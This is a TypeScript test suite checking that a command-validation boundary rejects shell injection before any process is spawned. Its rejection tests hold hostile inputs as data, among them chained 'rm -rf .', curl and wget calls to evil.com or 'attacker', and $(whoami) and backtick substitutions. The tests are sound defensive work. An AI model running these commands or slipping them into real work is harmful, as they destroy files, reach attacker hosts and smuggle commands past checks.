/**
 * Production Command Boundary Integration Tests
 *
 * These tests prove that:
 * 1. Both production execution paths (requirement-runner.ts and validation-executor.ts)
 *    use the canonical structured command boundary.
 * 2. No requirement-controlled string reaches execSync, exec, or a shell.
 * 3. The legacy adapter is fail-closed for all unsafe inputs.
 * 4. The structured contract enforces all security properties end-to-end.
 *
 * STATIC REGRESSION: Any future introduction of execSync in either production
 * file will cause the static import-scan test to fail immediately.
 */
import { describe, it, expect } from "bun:test"
import { readFileSync } from "fs"
import { join } from "path"

// ─── Production module imports ────────────────────────────────────────────────
import { runRequirements } from "../../src/better-harness/verification/requirement-runner"
import { executeValidation } from "../../src/better-harness/opencode/validation-executor"
import {
  executeValidatedCommand,
  executeValidatedCommandSync,
  parseLegacyRequirementString,
  validateCommandRequirement,
  type ValidationRequirement,
} from "../../src/services/command-boundary"

const ROOT = join(import.meta.dir, "../..")

// ─── Static Regression: No execSync in production files ──────────────────────
describe("Static Regression — no execSync in production executors", () => {
  const PRODUCTION_FILES = [
    "src/better-harness/verification/requirement-runner.ts",
    "src/better-harness/opencode/validation-executor.ts",
  ]

  for (const relPath of PRODUCTION_FILES) {
    it(`${relPath} must not import execSync`, () => {
      const src = readFileSync(join(ROOT, relPath), "utf-8")
      // Check for actual execSync call or import — comments are allowed
      expect(src).not.toMatch(/(?:^|[^*\s])execSync\s*\(/m)
    })

    it(`${relPath} must not use shell: true`, () => {
      const src = readFileSync(join(ROOT, relPath), "utf-8")
      expect(src).not.toMatch(/shell\s*:\s*true/)
    })
  }

  it("Both production files import from command-boundary", () => {
    const runner = readFileSync(join(ROOT, "src/better-harness/verification/requirement-runner.ts"), "utf-8")
    const executor = readFileSync(join(ROOT, "src/better-harness/opencode/validation-executor.ts"), "utf-8")
    expect(runner).toContain("command-boundary")
    expect(executor).toContain("command-boundary")
  })
})

// ─── Structured ValidationRequirement: success cases ─────────────────────────
describe("Production path — structured requirement success cases", () => {
  it("npm --version succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "npm", args: ["--version"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].passed).toBe(true)
    expect(results[0].output).toMatch(/\d+\.\d+/)
  })

  it("bun --version succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "bun", args: ["--version"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].passed).toBe(true)
    expect(results[0].output).toMatch(/\d+/)
  })

  it("node --version succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "node", args: ["--version"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].passed).toBe(true)
    expect(results[0].output).toContain("v")
  })

  it("git status --short succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "git", args: ["status", "--short"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    // Any exit code 0 means the command ran; status may produce empty output on clean tree
    expect(results[0].exitCode).toBe(0)
  })

  it("node --version succeeds through executeValidation with legacy string", () => {
    const result = executeValidation("node --version", process.cwd(), 5000)
    expect(result.passed).toBe(true)
    expect(result.exitCode).toBe(0)
    expect(result.stdout).toContain("v")
    expect(result.error).toBeNull()
  })
})

// ─── Structured ValidationRequirement: rejection before process creation ─────
describe("Production path — rejections before process creation", () => {
  it("git push is rejected by git subcommand allowlist", () => {
    expect(() =>
      validateCommandRequirement({ executable: "git", args: ["push", "origin", "main"] })
    ).toThrow(/not allowed in validation boundary/)
  })

  it("git commit is rejected by git subcommand allowlist", () => {
    expect(() =>
      validateCommandRequirement({ executable: "git", args: ["commit", "-m", "msg"] })
    ).toThrow()
  })

  it("unknown executable is rejected by allowlist", () => {
    expect(() =>
      validateCommandRequirement({ executable: "curl" as any, args: [] })
    ).toThrow(/not in the validation allowlist/)
  })

  it("NUL byte in arg is rejected", () => {
    expect(() =>
      validateCommandRequirement({ executable: "node", args: ["\x00"] })
    ).toThrow(/NUL byte/)
  })

  it("pipe metacharacter in arg is rejected", () => {
    expect(() =>
      validateCommandRequirement({ executable: "node", args: ["--version", "| cat"] })
    ).toThrow(/forbidden shell metacharacter/)
  })

  it("backtick in arg is rejected", () => {
    expect(() =>
      validateCommandRequirement({ executable: "node", args: ["`id`"] })
    ).toThrow(/forbidden shell metacharacter/)
  })

  it("command substitution $() in arg is rejected", () => {
    expect(() =>
      validateCommandRequirement({ executable: "node", args: ["$(whoami)"] })
    ).toThrow(/forbidden shell metacharacter/)
  })

  it("dangerous flag --eval is rejected", () => {
    expect(() =>
      validateCommandRequirement({ executable: "node", args: ["--eval", "process.exit(1)"] })
    ).toThrow(/Dangerous command flag/)
  })

  it("dangerous flag -e is rejected", () => {
    expect(() =>
      validateCommandRequirement({ executable: "node", args: ["-e", "1+1"] })
    ).toThrow(/Dangerous command flag/)
  })

  it("absolute path executable is rejected by validateCommandRequirement", () => {
    expect(() =>
      validateCommandRequirement({ executable: "/usr/bin/node" as any, args: [] })
    ).toThrow()
  })
})

// ─── Pipe injection rejected through executeValidation ────────────────────────
describe("Production path — injection rejection through executeValidation", () => {
  it("pipe payload is rejected before process creation", () => {
    const result = executeValidation("npm test | tee output", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("semicolon chaining is rejected before process creation", () => {
    const result = executeValidation("bun test; rm -rf .", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("redirect is rejected before process creation", () => {
    const result = executeValidation("git status > /tmp/out", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("backtick substitution is rejected before process creation", () => {
    const result = executeValidation("npm `whoami`", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("command substitution $() is rejected before process creation", () => {
    const result = executeValidation("npm $(id)", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("Windows cmd.exe is rejected", () => {
    const result = executeValidation("cmd.exe /c npm test", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("powershell is rejected", () => {
    const result = executeValidation("powershell -Command npm test", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("sh -c is rejected", () => {
    const result = executeValidation('sh -c "npm test"', process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("environment assignment is rejected", () => {
    const result = executeValidation("FOO=bar npm test", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("empty string is rejected", () => {
    const result = executeValidation("", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("absolute Windows path is rejected", () => {
    const result = executeValidation("C:\\Windows\\system32\\cmd.exe /c dir", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })
})

// ─── parseLegacyRequirementString approved examples ──────────────────────────
describe("parseLegacyRequirementString — approved inputs", () => {
  const APPROVED: Array<{ input: string; executable: string; args: string[] }> = [
    { input: "npm test", executable: "npm", args: ["test"] },
    { input: "npm run typecheck", executable: "npm", args: ["run", "typecheck"] },
    { input: "bun test tests/example.test.ts", executable: "bun", args: ["test", "tests/example.test.ts"] },
    { input: "git status --short", executable: "git", args: ["status", "--short"] },
    { input: "git diff --stat", executable: "git", args: ["diff", "--stat"] },
    { input: "tsc --noEmit", executable: "tsc", args: ["--noEmit"] },
    { input: "oxlint --deny-warnings", executable: "oxlint", args: ["--deny-warnings"] },
    { input: "node --version", executable: "node", args: ["--version"] },
  ]

  for (const { input, executable, args } of APPROVED) {
    it(`parses "${input}" correctly`, () => {
      const req = parseLegacyRequirementString(input)
      // Cast string to AllowedValidationExecutable for comparison
      expect(req.executable as string).toBe(executable)
      expect(req.args).toEqual(args)
    })
  }
})

// ─── parseLegacyRequirementString rejected examples ──────────────────────────
describe("parseLegacyRequirementString — rejected inputs", () => {
  const REJECTED = [
    "npm test && curl attacker",
    "npm test | tee output",
    "git status > output.txt",
    "bun test; rm -rf .",
    "$(whoami)",
    "`whoami`",
    "FOO=bar npm test",
    'sh -c "npm test"',
    "cmd.exe /c npm test",
    "powershell -Command npm test",
    "",
    'npm test "with quotes"',
    "../scripts/something.sh",
    "/usr/bin/npm test",
    "curl https://evil.com",
    "wget http://evil.com",
    "bash -c id",
    "python3 -c 'import os'",
  ]

  for (const input of REJECTED) {
    it(`rejects "${input.slice(0, 50)}"`, () => {
      expect(() => parseLegacyRequirementString(input)).toThrow()
    })
  }
})

// ─── Timeout and output bounds ────────────────────────────────────────────────
describe("Production path — timeout and output bounds", () => {
  it("executeValidatedCommandSync enforces timeout", () => {
    const result = executeValidatedCommandSync(
      { executable: "node", args: ["--version"], timeoutMs: 10_000 },
      process.cwd()
    )
    expect(result.exitCode).toBe(0)
  })

  it("executeValidatedCommand (async) enforces timeout", async () => {
    const result = await executeValidatedCommand(
      { executable: "node", args: ["--version"], timeoutMs: 10_000 },
      process.cwd()
    )
    expect(result.exitCode).toBe(0)
  })
})

// ─── Result ordering and isolation ───────────────────────────────────────────
describe("Production path — result ordering and isolation", () => {
  it("one failing requirement does not suppress later results", () => {
    const results = runRequirements(
      [
        // Disallowed git subcommand: rejected before spawn
        { executable: "git", args: ["push"] } as ValidationRequirement,
        { executable: "node", args: ["--version"] },
        { executable: "node", args: ["-v"] },
      ],
      process.cwd()
    )
    expect(results).toHaveLength(3)
    expect(results[0].passed).toBe(false) // git push blocked
    expect(results[1].passed).toBe(true)  // node --version
    expect(results[2].passed).toBe(true)  // node -v
  })

  it("result order matches input order", () => {
    const reqs: ValidationRequirement[] = [
      { executable: "node", args: ["--version"] },
      { executable: "bun", args: ["--version"] },
      { executable: "npm", args: ["--version"] },
    ]
    const results = runRequirements(reqs, process.cwd())
    expect(results).toHaveLength(3)
    for (let i = 0; i < 3; i++) {
      expect(results[i].passed).toBe(true)
    }
  })

  it("non-zero process exit is returned accurately", () => {
    // npm --nonexistent-flag-xyz should produce non-zero exit
    const results = runRequirements(
      [{ executable: "npm", args: ["--nonexistent-flag-xyz"] }],
      process.cwd()
    )
    expect(results[0].passed).toBe(false)
    expect(results[0].exitCode).not.toBe(0)
  })
})
